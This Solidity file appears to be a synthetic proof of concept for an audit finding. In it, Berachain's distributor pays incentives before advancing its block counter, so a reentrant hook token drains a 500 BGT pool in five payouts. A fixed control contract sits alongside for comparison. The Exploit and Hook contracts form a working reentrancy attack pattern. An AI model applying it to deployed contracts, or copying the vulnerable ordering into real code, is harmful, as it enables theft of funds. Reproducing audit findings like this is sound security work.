// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Berachain Distributor.distributeFor sends incentive tokens before it
    increments the actionable block (Spearbit, Oct 2024, Distributor.sol L113-L114).
    SYNTHETIC, cheatcode-free, one transaction.
    Each call pays 100 BGT. The pool holds 500 BGT. The incentive token calls
    back into distributeFor while the block is still actionable, so the same
    block pays five times and the validator receives 500 BGT.
    The control increments the block first. The callback does not run again.
    The control validator receives 100 BGT. */

contract Bgt {
    string public symbol = "BGT";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Hook {
    Bgt public bgt;
    address public dist;
    uint256 public pay;

    constructor(address _bgt) {
        bgt = Bgt(_bgt);
    }

    function arm(address _dist, uint256 _pay) external {
        dist = _dist;
        pay = _pay;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        to;
        amount;
        if (msg.sender == dist && bgt.balanceOf(dist) >= pay) {
            Distributor(dist).distributeFor();
        }
        return true;
    }
}

contract Distributor {
    Bgt public bgt;
    Hook public hook;
    address public validator;
    uint256 public nextBlock = 1;
    uint256 public constant PAY = 100 ether;

    constructor(address _bgt, address _hook, address _validator) {
        bgt = Bgt(_bgt);
        hook = Hook(_hook);
        validator = _validator;
    }

    function distributeFor() external {
        require(nextBlock == 1, "block");
        require(bgt.balanceOf(address(this)) >= PAY, "bgt");
        require(bgt.transfer(validator, PAY), "pay");
        // @> VULN: incentive transfer happens before nextBlock is incremented
        require(hook.transfer(validator, PAY), "incentive");
        nextBlock += 1;
    }
}

contract FixedDistributor {
    Bgt public bgt;
    Hook public hook;
    address public validator;
    uint256 public nextBlock = 1;
    uint256 public constant PAY = 100 ether;

    constructor(address _bgt, address _hook, address _validator) {
        bgt = Bgt(_bgt);
        hook = Hook(_hook);
        validator = _validator;
    }

    function distributeFor() external {
        require(nextBlock == 1, "block");
        require(bgt.balanceOf(address(this)) >= PAY, "bgt");
        nextBlock += 1;
        require(bgt.transfer(validator, PAY), "pay");
        require(hook.transfer(validator, PAY), "incentive");
    }
}

contract Validator {}

contract Exploit {
    uint256 public constant POOL = 500 ether;
    uint256 public constant PAY = 100 ether;
    address public constant SINK = 0x000000000000000000000000000000000000D00d;

    Bgt public bgt;
    Hook public hook;
    Validator public attacker;
    Validator public controlValidator;
    Distributor public buggy;
    FixedDistributor public fixedDist;

    uint256 public drained;
    uint256 public controlPaid;
    uint256 public extra;
    uint256 public rounds;

    constructor() {
        bgt = new Bgt();
        hook = new Hook(address(bgt));
        attacker = new Validator();
        controlValidator = new Validator();
        buggy = new Distributor(address(bgt), address(hook), address(attacker));
        fixedDist = new FixedDistributor(address(bgt), address(hook), address(controlValidator));
        hook.arm(address(buggy), PAY);
        bgt.mint(address(buggy), POOL);
        bgt.mint(address(fixedDist), POOL);
    }

    function run() external {
        require(bgt.balanceOf(address(buggy)) == POOL, "pool");
        require(hook.dist() == address(buggy), "armed");
        buggy.distributeFor();
        drained = bgt.balanceOf(address(attacker));
        require(drained == POOL, "drained");
        require(bgt.balanceOf(address(buggy)) == 0, "empty");
        require(buggy.nextBlock() == 6, "late increments");
        rounds = drained / PAY;
        require(rounds == 5, "five");
        fixedDist.distributeFor();
        controlPaid = bgt.balanceOf(address(controlValidator));
        require(controlPaid == PAY, "control");
        require(fixedDist.nextBlock() == 2, "control block");
        extra = drained - controlPaid;
        require(extra == 400 ether, "extra");
        require(bgt.balanceOf(address(fixedDist)) == POOL - PAY, "rest");
    }
}
